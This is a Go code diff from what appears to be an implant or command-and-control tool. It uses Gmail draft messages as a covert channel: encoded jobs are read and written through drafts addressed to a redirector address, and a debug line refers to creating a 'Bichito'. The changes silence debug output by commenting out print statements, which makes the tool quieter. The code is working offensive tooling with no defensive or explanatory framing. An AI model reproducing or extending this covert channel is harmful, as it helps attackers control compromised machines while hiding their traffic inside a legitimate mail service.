@@ -63,7 +63,8 @@ func PrepareNetworkMocule(jsonstring string) []string{
     errD := json.Unmarshal([]byte(jsonstring),&reds)
 
     if errD != nil{
-        fmt.Println("Parameters JSON Decoding error:"+errD.Error())
+        //Debug:
+        //fmt.Println("Parameters JSON Decoding error:"+errD.Error())
         os.Exit(1)
     }
 
@@ -125,12 +126,14 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
     for _,l := range r.Drafts{
         r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
             if err2 != nil {
-                fmt.Println(l.Message.Id)
+                //Debug:
+                //fmt.Println(l.Message.Id)
                 existBid = true
                 continue
                 //return result,"Get target Id Message: " +err2.Error()
             }
 
+        //Debug:
         //fmt.Println("Bid:"+r2.Payload.Headers[2].Value)
         //fmt.Println(r2.Payload.Headers[2].Value == bid)
         if (r2.Payload.Headers[2].Value == bid) {existBid = true}
@@ -141,7 +144,8 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
             if err != nil {
                 return result,err.Error()
             }
-            fmt.Println("Bid:"+r2.Payload.Headers[2].Value+"TO:"+r2.Payload.Headers[1].Value+"Body:"+string(result))
+            //Debug:
+            //fmt.Println("Bid:"+r2.Payload.Headers[2].Value+"TO:"+r2.Payload.Headers[1].Value+"Body:"+string(result))
             return result,"Success"
                
         }
@@ -203,11 +207,8 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
     if err != nil {
         return "Unable to retrieve Gmail client:"+ err.Error()
     }
-    //
 
-    //var messagesIds []string
-    //var draftIds []string
-    //var targetDraft string
+
     user := "me"
     r, err := srv.Users.Drafts.List(user).Do()
     if err != nil {
@@ -219,12 +220,10 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
         r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
         if err2 != nil {
                 continue
-                //return "Get target Id Message: " +err2.Error()
         }
         if (r2.Payload.Headers[2].Value == bid){
             rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bid+"\r\n\r\n"+string(encodedJob)
             rawDraftFormatted := base64.RawURLEncoding.EncodeToString([]byte(rawDraft))
-            //.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
             rawDraftFormatted = strings.Replace(rawDraftFormatted,"+","-",-1)
             rawDraftFormatted = strings.Replace(rawDraftFormatted,"/","_",-1)
             rawDraftFormatted = strings.Replace(rawDraftFormatted,"=","",-1)
@@ -233,7 +232,8 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
        
             _, err = srv.Users.Drafts.Update(user,l.Id,draft).Do()
             if err != nil {
-                fmt.Println(err.Error())
+                //Debug:
+                //fmt.Println(err.Error())
                 return err.Error()
             }
 
@@ -269,9 +269,10 @@ func Checking(redirector string,authentication string,bidP string,encodedJob []b
     if err != nil {
         return "Unable to retrieve Gmail client:"+ err.Error()
     }
-    //
 
-    fmt.Println("To Create Bichito:"+bidP)
+    //Debug:
+    //fmt.Println("To Create Bichito:"+bidP)
+    
     rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bidP+"\r\n\r\n"+string(encodedJob)
     rawDraftFormatted := base64.RawURLEncoding.EncodeToString([]byte(rawDraft))
     rawDraftFormatted = strings.Replace(rawDraftFormatted,"+","-",-1)
